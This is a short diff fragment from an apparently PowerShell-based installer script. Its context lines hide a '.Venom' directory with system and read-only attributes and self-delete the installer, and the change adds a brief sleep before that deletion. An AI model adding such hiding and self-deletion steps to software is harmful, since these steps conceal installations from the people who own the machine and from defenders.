@@ -128,5 +128,8 @@ attrib +h +s +r .Venom
 
 # self delete
 cd $initial_dir
+
+Sleep (200)
+
 del installer.ps1
 
